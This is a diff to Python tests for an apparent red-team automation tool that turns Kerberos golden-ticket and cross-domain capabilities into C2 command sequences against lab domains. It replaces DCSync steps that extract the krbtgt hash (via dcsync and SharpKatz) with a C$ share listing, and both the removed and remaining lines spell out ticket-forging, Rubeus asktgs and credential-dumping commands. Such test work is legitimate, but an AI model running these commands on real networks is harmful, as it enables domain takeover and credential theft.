@@ -631,7 +631,7 @@ def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequen
 
     assert mythic_plan.ok is True
     # Cross-domain forge: import the child TGT into the current session, then ask Windows to acquire the parent
-    # LDAP ticket before the parent DCSync proof authenticates.
+    # CIFS ticket before proving current-callback access. DCSync is a later capability after the context gate.
     assert [command.command for command in mythic_plan.commands] == [
         "shell",
         "shell",
@@ -640,7 +640,7 @@ def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequen
         "ticket_cache_add",
         "ticket_cache_list",
         "shell",
-        "dcsync",
+        "shell",
     ]
     preflight_list = mythic_plan.commands[0]
     assert preflight_list.produces == ["kerberos_context_inventory"]
@@ -686,13 +686,12 @@ def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequen
     assert mythic_plan.commands[5].consumes == ["kerberos_ticket_imported"]
     acquire = mythic_plan.commands[6]
     assert acquire.command == "shell"
-    assert acquire.parameters == "klist.exe get ldap/kingslanding.sevenkingdoms.local"
+    assert acquire.parameters == "klist.exe get cifs/kingslanding.sevenkingdoms.local"
     assert acquire.produces == ["kerberos_service_ticket_acquired"]
     proof = mythic_plan.commands[7]
-    assert proof.command == "dcsync"
-    assert proof.parameters["domain"] == "sevenkingdoms.local"
-    assert proof.parameters["user"] == "SEVENKINGDOMS\\krbtgt"
-    assert proof.parameters["dc"] == "kingslanding.sevenkingdoms.local"
+    assert proof.command == "shell"
+    assert proof.parameters == "dir \\\\kingslanding.sevenkingdoms.local\\C$"
+    assert proof.consumes == ["kerberos_context_inventory", "kerberos_service_ticket_acquired"]
     assert proof.deferred is False
     assert intent_classifier.classify_tool_call(command.command, command.parameters) == (
         "sid-history-escalation",
@@ -734,7 +733,7 @@ def test_adapter_preserves_explicit_asktgs_cross_domain_fallback():
     assert referral_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
     assert "/service:krbtgt/root.local" in referral_args
     assert service_ticket_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
-    assert "/service:ldap/dc01.root.local" in service_ticket_args
+    assert "/service:cifs/dc01.root.local" in service_ticket_args
 
 
 def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
@@ -768,8 +767,7 @@ def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
         "invoke-assembly",
         "run",
         "run",
-        "load-assembly",
-        "invoke-assembly",
+        "ls",
     ]
     assert mythic_plan.commands[4].parameters == {"filename": "Rubeus.exe"}
     assert mythic_plan.commands[5].parameters == {
@@ -778,12 +776,10 @@ def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
     }
     assert mythic_plan.commands[7].parameters == {
         "executable": "klist.exe",
-        "arguments": "get ldap/dc01.root.local",
+        "arguments": "get cifs/dc01.root.local",
     }
-    assert mythic_plan.commands[8].parameters == {"filename": "SharpKatz.exe"}
-    assert mythic_plan.commands[9].parameters == {
-        "assembly": "SharpKatz.exe",
-        "arguments": "--Command dcsync --User ROOT\\krbtgt --Domain root.local --DomainController dc01.root.local",
+    assert mythic_plan.commands[8].parameters == {
+        "path": "\\\\dc01.root.local\\C$",
     }
     rendered = " ".join(
         str(value)
@@ -797,7 +793,7 @@ def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
     assert "asktgs" not in rendered
 
 
-def test_cross_domain_dcsync_step_forces_native_executor_over_global_mimikatz_config():
+def test_cross_domain_forge_proof_uses_service_access_even_with_global_mimikatz_config():
     action = capabilities.CapabilityAction(
         name="forge-golden-ticket",
         target="domain=child.root.local;target_domain=root.local",
@@ -823,12 +819,8 @@ def test_cross_domain_dcsync_step_forces_native_executor_over_global_mimikatz_co
     })
 
     proof = mythic_plan.commands[-1]
-    assert proof.command == "dcsync"
-    assert proof.parameters == {
-        "domain": "root.local",
-        "user": "ROOT\\krbtgt",
-        "dc": "dc01.root.local",
-    }
+    assert proof.command == "shell"
+    assert proof.parameters == "dir \\\\dc01.root.local\\C$"
 
 
 def test_adapter_translates_current_context_ticket_purge():
